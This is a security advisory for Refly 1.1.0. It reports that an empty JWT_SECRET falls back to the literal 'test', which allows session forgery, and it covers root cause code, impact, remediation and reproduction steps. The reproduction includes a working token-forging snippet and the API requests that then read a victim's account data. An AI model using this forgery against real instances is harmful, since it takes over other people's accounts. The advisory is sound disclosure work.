@@ -1,0 +1,150 @@
+
+
+┌────────────────┬──────────────────────────────────────────────────────────────────────────────────┐
+│ Field          │ Value                                                                            │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Title          │ Hard-coded default JWT secret test allows session forgery                        │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Vendor         │ Refly AI                                                                         │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Product        │ Refly (self-hosted / official Docker)                                            │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Affected       │ 1.1.0 (GitHub release v1.1.0; Docker tags latest and 1.1.0, image digest         │
+│ versions       │ sha256:f75324a37835…, published 2026-02-03)                                      │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Fixed versions │ None at the time of this report                                                  │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ CWE            │ CWE-798, CWE-1188, CWE-287                                                       │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+│ Attack vector  │ Network, unauthenticated                                                         │
+├────────────────┼──────────────────────────────────────────────────────────────────────────────────┤
+
+1. CVSS 3.1
+
+┌──────────────────────────────────────────┬───────┬──────────┬─────────────────────────────────────┐
+│ Scenario                                 │ Score │ Severity │ Vector                              │
+├──────────────────────────────────────────┼───────┼──────────┼─────────────────────────────────────┤
+│ Default (uid is not enumerable)          │ 7.4   │ High     │ AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N │
+├──────────────────────────────────────────┼───────┼──────────┼─────────────────────────────────────┤
+│ If a real uid is already public on the   │ 8.1   │ High     │ AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N │
+│ same instance                            │       │          │                                     │
+└──────────────────────────────────────────┴───────┴──────────┴─────────────────────────────────────┘
+
+2. Summary
+
+Official self-hosted installation leaves JWT_SECRET empty. The API then signs and verifies JWTs with the literal string test. The auth guard does not load the user from the database. An attacker who knows a victim uid can mint a valid access token and call authenticated APIs as that user.
+
+The official self-host documentation never requires operators to set JWT_SECRET. The shipped env.example contains JWT_SECRET= with no warning.
+
+3. Root Cause
+
+File: apps/api/src/modules/config/app.config.ts
+
+jwt: {
+  secret: process.env.JWT_SECRET || 'test',
+  expiresIn: process.env.JWT_EXPIRATION_TIME || '1d',
+  refreshExpiresIn: process.env.JWT_REFRESH_EXPIRATION_TIME || '14d',
+},
+
+An empty environment variable is falsy, so the runtime secret becomes test.
+
+File: apps/api/src/modules/auth/guard/jwt-auth.guard.ts
+
+The guard verifies the token with auth.jwt.secret and sets request.user = payload. There is no database lookup and no check that the uid still exists.
+
+File: apps/api/src/modules/auth/auth.service.ts
+
+Access tokens are signed as { uid, email } only.
+
+File: deploy/docker/env.example
+
+JWT_SECRET=
+
+File: docs/community-version/self-deploy/index.md
+
+The guide says only “Edit .env with required settings”. It never names JWT_SECRET. The same env.example documents how to generate ENCRYPTION_KEY.
+
+4. Impact
+
+On a default official Docker or self-host install:
+
+1. An unauthenticated attacker can forge HS256 access tokens using the secret test.
+2. If a real uid is known, the attacker can invoke any JwtAuthGuard endpoint as that user, including profile, canvases, drive files, and provider configuration.
+3. uid is not enumerable. Without a separate uid leak, this is a hard-coded credential issue, not unauthenticated mass account takeover.
+4. Surfaces that may expose uid when content exists include GET /v1/template/list (DTO includes uid), public share JSON (owner.uid), and GET /v1/canvas/data?canvasId= (ownership check is optional in code).
+
+5. Reproduction
+
+Environment:
+
+• Official compose: cd deploy/docker && cp env.example .env && docker compose up -d
+• JWT_SECRET is unset
+• Base URL: http://localhost:5700
+
+5.1 Create a victim account
+
+POST /api/v1/auth/email/signup
+Content-Type: application/json
+
+{"email":"victim@example.local","password":"VictimPass123!"}
+
+Read Set-Cookie: _rf_uid=u-..., or decode the payload of _rf_access. This is how the product itself emits uid after signup. A real attack requires a different leak.
+
+5.2 Negative control
+
+Sign a token with a wrong secret and send:
+
+GET /api/v1/user/me
+Authorization: Bearer <token signed with "wrong-secret">
+
+Expected: 401 Unauthorized.
+
+5.3 Forge a token as the victim (no password)
+
+const jwt = require("jsonwebtoken");
+const token = jwt.sign(
+  { uid: "<victim uid from 5.1>", email: "victim@example.local" },
+  "test"
+);
+
+GET /api/v1/user/me
+Authorization: Bearer <token from this step>
+
+Expected: 200, body contains the victim uid and email.
+
+5.4 Confirm account data, not only payload echo
+
+GET /api/v1/user/settings
+Authorization: Bearer <forged token>
+
+GET /api/v1/canvas/list
+Authorization: Bearer <forged token>
+
+Expected: victim account data. A token for a non-existent uid must not be treated as successful takeover.
+
+5.5 Control with a real secret
+
+Set JWT_SECRET to a long random value, recreate the API container, and repeat 5.3. Expected: 401.
+
+6. Remediation
+
+1. Do not default to test. Refuse to start if JWT_SECRET is missing or shorter than 32 bytes.
+2. Document JWT_SECRET as required in the self-host guide and in env.example.
+3. After signature verification, load the user from the database and reject unknown uid values.
+4. Rotate the secret and invalidate existing tokens on upgrade.
+
+7. References
+
+┌───────────────────┬───────────────────────────────────────────────────────┐
+│ Resource          │ URL                                                   │
+├───────────────────┼───────────────────────────────────────────────────────┤
+│ Source repository │ https://github.com/refly-ai/refly                     │
+├───────────────────┼───────────────────────────────────────────────────────┤
+│ Release v1.1.0    │ https://github.com/refly-ai/refly/releases/tag/v1.1.0 │
+├───────────────────┼───────────────────────────────────────────────────────┤
+│ Self-host guide   │ https://docs.refly.ai/community-version/self-deploy   │
+├───────────────────┼───────────────────────────────────────────────────────┤
+│ CWE-798           │ https://cwe.mitre.org/data/definitions/798.html       │
+├───────────────────┼───────────────────────────────────────────────────────┤
+│ CWE-287           │ https://cwe.mitre.org/data/definitions/287.html       │
+└───────────────────┴───────────────────────────────────────────────────────┘
